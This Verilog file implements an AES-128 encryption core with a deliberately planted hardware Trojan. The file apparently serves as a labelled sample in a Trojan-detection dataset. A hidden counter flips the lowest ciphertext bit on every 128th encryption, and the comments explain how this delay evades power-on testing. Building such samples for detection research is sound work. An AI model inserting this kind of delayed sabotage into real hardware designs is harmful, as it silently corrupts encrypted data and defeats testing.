// aes_128_trojan_counter.v
// TROJAN VARIANT 2: Counter-Based Trigger + Output Corruption Payload
// -----------------------------------------------------------------------
// Trigger:  Sequential. A hidden 8-bit counter increments every time an
//           encryption completes (every "start" pulse). After exactly
//           128 encryptions, the Trojan fires ONCE, then keeps firing
//           every 128th encryption after that (rare, time-delayed trigger --
//           mimics real Trojans that wait for a "warm-up" period to evade
//           power-on testing).
// Payload:  Flips the LSB of the ciphertext -- a subtle correctness/
//           denial-of-service style fault, not a key leak.
// Stealth:  For the first 127 runs, output is bit-identical to clean AES.
//           Extra hardware = 1x 8-bit counter + 1x comparator + 1x XOR gate
//           on the output bit. This variant is useful because its trigger
//           is TIME-based rather than DATA-based, so your dataset can show
//           the model detecting a different trigger *mechanism*, not just
//           a different payload.
// -----------------------------------------------------------------------

module aes_128_trojan_counter (
    input  wire         clk,
    input  wire         rst,
    input  wire         start,
    input  wire [127:0] plaintext,
    input  wire [127:0] key,
    output reg  [127:0] ciphertext,
    output reg          done
);

    localparam [7:0] TRIGGER_COUNT = 8'd127; // fires when counter == 127 (i.e. 128th run)

    // ---- TROJAN TRIGGER LOGIC ----
    reg  [7:0] trojan_counter;
    wire       trojan_trigger = (trojan_counter == TRIGGER_COUNT);

    // ---- Key expansion (identical to clean baseline) ----
    wire [127:0] rk0, rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8, rk9, rk10;
    key_expansion u_ke (
        .key(key),
        .round_key0(rk0), .round_key1(rk1), .round_key2(rk2), .round_key3(rk3),
        .round_key4(rk4), .round_key5(rk5), .round_key6(rk6), .round_key7(rk7),
        .round_key8(rk8), .round_key9(rk9), .round_key10(rk10)
    );

    localparam IDLE = 2'd0, RUN = 2'd1, DONE_ST = 2'd2;
    reg [1:0]   fsm_state;
    reg [127:0] state_reg;
    reg [3:0]   round_cnt;

    reg [127:0] cur_round_key;
    always @(*) begin
        case (round_cnt)
            4'd0:  cur_round_key = rk0;
            4'd1:  cur_round_key = rk1;
            4'd2:  cur_round_key = rk2;
            4'd3:  cur_round_key = rk3;
            4'd4:  cur_round_key = rk4;
            4'd5:  cur_round_key = rk5;
            4'd6:  cur_round_key = rk6;
            4'd7:  cur_round_key = rk7;
            4'd8:  cur_round_key = rk8;
            4'd9:  cur_round_key = rk9;
            4'd10: cur_round_key = rk10;
            default: cur_round_key = 128'd0;
        endcase
    end

    wire [127:0] sb_out, sr_out, mc_out, ark_out;
    sub_bytes   u_sb (.state_in(state_reg), .state_out(sb_out));
    shift_rows  u_sr (.state_in(sb_out),    .state_out(sr_out));
    mix_columns u_mc (.state_in(sr_out),    .state_out(mc_out));

    wire [127:0] pre_ark = (round_cnt == 4'd10) ? sr_out : mc_out;
    add_round_key u_ark (.state_in(pre_ark), .round_key(cur_round_key), .state_out(ark_out));

    always @(posedge clk) begin
        if (rst) begin
            fsm_state      <= IDLE;
            state_reg      <= 128'd0;
            round_cnt      <= 4'd0;
            ciphertext     <= 128'd0;
            done           <= 1'b0;
            trojan_counter <= 8'd0;
        end else begin
            case (fsm_state)
                IDLE: begin
                    done <= 1'b0;
                    if (start) begin
                        state_reg <= plaintext ^ rk0;
                        round_cnt <= 4'd1;
                        fsm_state <= RUN;
                    end
                end

                RUN: begin
                    state_reg <= ark_out;
                    if (round_cnt == 4'd10)
                        fsm_state <= DONE_ST;
                    else
                        round_cnt <= round_cnt + 4'd1;
                end

                DONE_ST: begin
                    // ---- TROJAN PAYLOAD ----
                    // Flip LSB only on the rare triggered run; otherwise
                    // ciphertext is identical to the clean baseline.
                    ciphertext <= trojan_trigger ? {state_reg[127:1], ~state_reg[0]}
                                                  : state_reg;
                    done       <= 1'b1;
                    fsm_state  <= IDLE;

                    // ---- TROJAN TRIGGER counter update ----
                    trojan_counter <= trojan_trigger ? 8'd0 : (trojan_counter + 8'd1);
                end

                default: fsm_state <= IDLE;
            endcase
        end
    end

endmodule
